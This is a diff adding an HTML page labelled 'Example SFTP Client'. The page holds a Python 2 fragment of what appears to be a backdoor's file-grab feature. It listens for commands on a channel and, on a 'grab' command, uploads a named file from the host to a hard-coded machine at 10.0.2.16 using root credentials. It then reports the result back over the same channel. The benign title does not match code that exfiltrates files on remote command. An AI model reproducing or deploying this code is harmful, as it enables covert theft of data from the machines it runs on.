@@ -1,0 +1,21 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Example SFTP Client</title>
+</head><body>def sftp(local_path,name):<br/>
+  try:<br/>
+    transport = paramiko.Transport(('10.0.2.16', 22))<br/>
+    transport.connect(username = 'root', password = 'toor')<br/>
+    sftp = paramiko.SFTPClient.from_transport(transport)<br/>
+    sftp.put(local_path, '/root/Desktop/SFTP-Upload/'+name)<br/>
+    sftp.close()<br/>
+    transport.close()<br/>
+    return '[+] Done'<br/>
+  except Exception,e:<br/>
+    return str(e)<br/>
+<br/>
+while True:<br/>
+  command = chan.recv(1024)<br/>
+  if 'grab' in command:<br/>
+    grab,name,path = command.split('*')<br/>
+    chan.send( sftp(path,name) )</body></html>
